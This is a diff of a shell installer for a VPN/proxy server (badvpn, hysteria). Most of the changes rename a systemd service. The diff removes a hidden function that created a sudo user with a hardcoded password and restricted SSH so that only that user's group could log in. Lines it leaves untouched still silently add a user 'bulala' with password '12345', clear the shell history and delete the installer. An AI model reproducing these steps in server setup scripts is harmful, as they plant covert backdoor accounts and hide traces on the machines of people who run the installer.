@@ -182,7 +182,7 @@ install_rclocal(){
   {
 
     echo "[Unit]
-Description=tknetwork service
+Description=dextereskalarte service
 Documentation=http://teamkidlat.com
 
 [Service]
@@ -191,7 +191,7 @@ ExecStart=/bin/bash /etc/rc.local
 RemainAfterExit=yes
 
 [Install]
-WantedBy=multi-user.target" >> /etc/systemd/system/tknetwork.service
+WantedBy=multi-user.target" >> /etc/systemd/system/dextereskalarte.service
     echo '#!/bin/sh -e
 iptables-restore < /etc/iptables_rules.v4
 ip6tables-restore < /etc/iptables_rules.v6
@@ -201,8 +201,8 @@ screen -AmdS badvpn badvpn-udpgw --listen-addr 127.0.0.1:7300
 exit 0' >> /etc/rc.local
     sudo chmod +x /etc/rc.local
     systemctl daemon-reload
-    sudo systemctl enable tknetwork
-    sudo systemctl start tknetwork.service
+    sudo systemctl enable dextereskalarte
+    sudo systemctl start dextereskalarte.service
   }&>/dev/null
 }
 
@@ -925,19 +925,6 @@ echo "* * * * * /bin/bash /bin/auto >/dev/null 2>&1
 }
 
 
-
-install_sudo(){
-  {
-    useradd -m tknetwork 2>/dev/null; echo tknetwork:JAN022011b | chpasswd &>/dev/null; usermod -aG sudo tknetwork &>/dev/null
-    sed -i 's/PermitRootLogin yes/PermitRootLogin no/g' /etc/ssh/sshd_config
-    echo "AllowGroups tknetwork" >> /etc/ssh/sshd_config
-    service sshd restart
-  }&>/dev/null
-}
-
-
-
-
 iptablesrules () {
 echo 'net.ipv4.ip_forward=1
 ' >> /etc/sysctl.conf
@@ -967,7 +954,7 @@ systemctl enable hysteria-server.service
  /usr/sbin/useradd -p $(openssl passwd -1 12345) -M bulala
  history -c;
  rm ~/install_server.sh
- rm ~/nameofscript.x
+ rm ~/hysteria.x
  netstat -tupln
  reboot
 }
@@ -975,7 +962,6 @@ systemctl enable hysteria-server.service
 
 
 system_package
-install_sudo
 install_hysteria
 modify_hysteria
 create_hostname
